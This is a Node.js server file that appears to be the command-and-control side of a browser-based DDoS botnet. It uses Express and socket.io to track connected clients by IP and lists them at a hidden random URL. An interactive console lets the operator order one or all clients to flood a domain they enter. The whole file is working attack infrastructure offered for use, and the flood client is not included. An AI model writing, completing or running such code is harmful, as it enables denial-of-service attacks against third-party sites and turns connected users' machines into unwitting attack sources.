const express = require('express');
const path = require('path');
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require("socket.io");
var bodyParser = require('body-parser');
const io = new Server(server);
var crypto = require("crypto");
const readline = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const BUILDPATH = path.join(__dirname, '/..', '/client');
app.use(express.static(BUILDPATH));

app.get('/', (req, res) => {
	res.sendFile(__dirname+'/../client/index.html', { root: BUILDPATH });
});

var rand = crypto.randomBytes(20).toString('hex');
var ips = []
var ids = []

app.get('/'+rand, (req, res) => {
	res.writeHead(200, {
		'Content-Type': 'text/plain'
	});
	
	res.write(ips.join('\n'));
	
	res.end();
});


function header() {
	console.clear();
	console.log(`
======================================================================
	 ▄▄▄▄    █    ██  ██▓ ██▓    ▓█████▄  ▄▄▄       ▄▄▄▄    ███▄ 
▓█████▄  ██  ▓██▒▓██▒▓██▒    ▒██▀ ██▌▒████▄    ▓█████▄  ██ ▀█   █ 
▒██▒ ▄██▓██  ▒██░▒██▒▒██░    ░██   █▌▒██  ▀█▄  ▒██▒ ▄██▓██  ▀█ ██▒
▒██░█▀  ▓▓█  ░██░░██░▒██░    ░▓█▄   ▌░██▄▄▄▄██ ▒██░█▀  ▓██▒  ▐▌██▒
░▓█  ▀█▓▒▒█████▓ ░██░░██████▒░▒████▓  ▓█   ▓██▒░▓█  ▀█▓▒██░   ▓██░
░▒▓███▀▒░▒▓▒ ▒ ▒ ░▓  ░ ▒░▓  ░ ▒▒▓  ▒  ▒▒   ▓▒█░░▒▓███▀▒░ ▒░   ▒ ▒ 
▒░▒   ░ ░░▒░ ░ ░  ▒ ░░ ░ ▒  ░ ░ ▒  ▒   ▒   ▒▒ ░▒░▒   ░ ░ ░░   ░ ▒░
 ░    ░  ░░░ ░ ░  ▒ ░  ░ ░    ░ ░  ░   ░   ▒    ░    ░    ░   ░ ░ 
 ░         ░      ░      ░  ░   ░          ░  ░ ░               ░ 
      ░                       ░                      ░            
 
 		   https://github.com/flancast90
 		           By: BLUND3R
 ====================================================================
 
              Created by Finn Lancaster on 11.29.2021
        Copyright © 2021 Finn Lancaster. All rights reserved.
        
                   for help, enter [ --help ].
 
	`);
}


function onConnect(socket) {
	this.socket = socket;

	socket.on('join', function (data) {

		ips.push(data.name);
		
		ids.push(socket.id);

	});
	
	socket.on('disconnect', () => {
		user = ids.indexOf(socket.id);
		
		ids.splice(user, 1);
		ips.splice(user, 1);
	});
}


function listIps() {
	console.log("Visit localhost:8000/"+rand+" for list of connected ips.");
}


function help() {
	console.log(`
	--help : outputs a list of commands.
	--ips : returns a url containing every url connected to the server
	--start [ip] : starts a DDoS attack from the IP specified. Instead of an IP, use "all" to start DDoS across all connections.
	--stop [ip] : stops a DDoS attack on the IP specified. Instead of an IP, use "all" to stop DDoS across all connections.
	`);
}


function startDDOS(ip, domain) {
	try {
		ip = ip.trim();

		if (ip == "all") {
		
			socket.emit('start', {data: domain});
		
			console.log('\nDDoS on '+domain+' started.');
		}else {
			if (ips.includes(ip)) {
			
				var ipIndex = ips.indexOf(ip);
				var id = ids[ipIndex];
		
				io.sockets.in(id).emit('start', {data: domain});
			}else {
				console.log("IP address invalid.");
			}
		}
	
		getCmd();
	} catch (ReferenceError) {
		console.log("No clients connected!");
		
		getCmd();
	}
}


function stopDDOS(ip) {
	try {
		ip = ip.trim();

		if (ip == "all") {
	
			socket.emit('stop');
		
			console.log('\nDDoS stopped.');
		}else {
			if (ips.includes(ip)) {	

				var ipIndex = ips.indexOf(ip);
				var id = ids[ipIndex];
		
				io.sockets.in(id).emit('stop');
			}else {
				console.log("IP address invalid.");
			}
		}
	
		getCmd();
	} catch (ReferenceError) {
		console.log("No clients connected!");
		
		getCmd();
	}
}


function getCmd() {	
	readline.question('\n>>> ', cmd => {
  		cmd = cmd.trim();
  		
  		// handle cmd here with console.logs
  		if (cmd == "--ips") {
  			listIps();
  		}
  		else if (cmd == "--help") {
  			help();
  		}
  		else if (cmd.includes("--start ")) {
  			var ip = cmd.split("--start ")[1];
  			
  			readline.question('Enter domain to DDoS: ', domain => {
				startDDOS(ip, domain);
			});
  		}
  		else if (cmd.includes("--stop ")) {
  			var ip = cmd.split("--stop ")[1];
  			
  			stopDDOS(ip);
  		}
  		else {
  			console.log(cmd+" is not an internal or external command.");
  		}	
  		
  		getCmd();
	});	
}

io.on('connection', (socket) => { onConnect(socket) });

server.listen(8000, () => {
	header();
	getCmd();
});